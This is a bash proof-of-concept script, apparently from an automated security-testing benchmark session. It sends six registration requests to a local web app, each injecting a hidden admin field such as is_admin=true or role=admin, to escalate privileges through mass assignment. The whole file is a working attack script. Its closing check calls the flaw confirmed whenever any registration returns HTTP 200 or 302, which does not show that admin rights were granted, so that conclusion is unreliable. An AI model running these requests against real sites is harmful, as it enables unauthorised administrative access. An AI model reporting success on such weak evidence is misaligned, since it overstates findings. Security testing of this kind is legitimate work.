#!/bin/bash
# POC: Demonstrates privilege escalation via hidden parameter injection during registration by injecting admin role parameters into the registration request
# Target: ./repo
# Created: 2025-11-10T14:44:24.066Z
# Session: benchmark-XBEN-024-24-mht8yjhk

# Privilege Escalation via Hidden Parameter Injection - POC
# This script demonstrates how an attacker can escalate privileges
# to administrative level by injecting hidden parameters during registration

TARGET_URL="http://localhost:3000"
REGISTER_ENDPOINT="/register"

echo "=========================================="
echo "Privilege Escalation POC"
echo "Target: $TARGET_URL$REGISTER_ENDPOINT"
echo "=========================================="
echo ""

# Test 1: Register with is_admin=true parameter
echo "[*] Test 1: Attempting registration with is_admin=true"
USERNAME1="priv_esc_user1_$(date +%s)"
RESPONSE1=$(curl -s -X POST "$TARGET_URL$REGISTER_ENDPOINT" \
  -d "username=$USERNAME1&password=test123&first_name=Test&last_name=User&email=$USERNAME1@example.com&is_admin=true" \
  -w "\nHTTP_STATUS:%{http_code}")

echo "Response:"
echo "$RESPONSE1"
echo ""

# Test 2: Register with role=admin parameter
echo "[*] Test 2: Attempting registration with role=admin"
USERNAME2="priv_esc_user2_$(date +%s)"
RESPONSE2=$(curl -s -X POST "$TARGET_URL$REGISTER_ENDPOINT" \
  -d "username=$USERNAME2&password=test123&first_name=Test&last_name=User&email=$USERNAME2@example.com&role=admin" \
  -w "\nHTTP_STATUS:%{http_code}")

echo "Response:"
echo "$RESPONSE2"
echo ""

# Test 3: Register with is_superuser=true parameter
echo "[*] Test 3: Attempting registration with is_superuser=true"
USERNAME3="priv_esc_user3_$(date +%s)"
RESPONSE3=$(curl -s -X POST "$TARGET_URL$REGISTER_ENDPOINT" \
  -d "username=$USERNAME3&password=test123&first_name=Test&last_name=User&email=$USERNAME3@example.com&is_superuser=true" \
  -w "\nHTTP_STATUS:%{http_code}")

echo "Response:"
echo "$RESPONSE3"
echo ""

# Test 4: Register with isAdmin=true parameter
echo "[*] Test 4: Attempting registration with isAdmin=true"
USERNAME4="priv_esc_user4_$(date +%s)"
RESPONSE4=$(curl -s -X POST "$TARGET_URL$REGISTER_ENDPOINT" \
  -d "username=$USERNAME4&password=test123&first_name=Test&last_name=User&email=$USERNAME4@example.com&isAdmin=true" \
  -w "\nHTTP_STATUS:%{http_code}")

echo "Response:"
echo "$RESPONSE4"
echo ""

# Test 5: Register with user_role=admin parameter
echo "[*] Test 5: Attempting registration with user_role=admin"
USERNAME5="priv_esc_user5_$(date +%s)"
RESPONSE5=$(curl -s -X POST "$TARGET_URL$REGISTER_ENDPOINT" \
  -d "username=$USERNAME5&password=test123&first_name=Test&last_name=User&email=$USERNAME5@example.com&user_role=admin" \
  -w "\nHTTP_STATUS:%{http_code}")

echo "Response:"
echo "$RESPONSE5"
echo ""

# Test 6: Register with admin=true parameter
echo "[*] Test 6: Attempting registration with admin=true"
USERNAME6="priv_esc_user6_$(date +%s)"
RESPONSE6=$(curl -s -X POST "$TARGET_URL$REGISTER_ENDPOINT" \
  -d "username=$USERNAME6&password=test123&first_name=Test&last_name=User&email=$USERNAME6@example.com&admin=true" \
  -w "\nHTTP_STATUS:%{http_code}")

echo "Response:"
echo "$RESPONSE6"
echo ""

# Extract HTTP status codes
STATUS1=$(echo "$RESPONSE1" | grep "HTTP_STATUS" | cut -d: -f2)
STATUS2=$(echo "$RESPONSE2" | grep "HTTP_STATUS" | cut -d: -f2)
STATUS3=$(echo "$RESPONSE3" | grep "HTTP_STATUS" | cut -d: -f2)
STATUS4=$(echo "$RESPONSE4" | grep "HTTP_STATUS" | cut -d: -f2)
STATUS5=$(echo "$RESPONSE5" | grep "HTTP_STATUS" | cut -d: -f2)
STATUS6=$(echo "$RESPONSE6" | grep "HTTP_STATUS" | cut -d: -f2)

echo "=========================================="
echo "Results Summary:"
echo "=========================================="
echo "Test 1 (is_admin=true):      HTTP $STATUS1"
echo "Test 2 (role=admin):         HTTP $STATUS2"
echo "Test 3 (is_superuser=true):  HTTP $STATUS3"
echo "Test 4 (isAdmin=true):       HTTP $STATUS4"
echo "Test 5 (user_role=admin):    HTTP $STATUS5"
echo "Test 6 (admin=true):         HTTP $STATUS6"
echo ""

# Check if any registrations succeeded (HTTP 200 or 302 redirect)
if [[ "$STATUS1" == "200" || "$STATUS1" == "302" ]] || \
   [[ "$STATUS2" == "200" || "$STATUS2" == "302" ]] || \
   [[ "$STATUS3" == "200" || "$STATUS3" == "302" ]] || \
   [[ "$STATUS4" == "200" || "$STATUS4" == "302" ]] || \
   [[ "$STATUS5" == "200" || "$STATUS5" == "302" ]] || \
   [[ "$STATUS6" == "200" || "$STATUS6" == "302" ]]; then
  echo "[+] VULNERABILITY CONFIRMED: Hidden admin parameters accepted during registration!"
  echo "[+] Accounts created with admin privilege parameters processed successfully"
  exit 0
else
  echo "[-] No successful registrations detected"
  exit 1
fi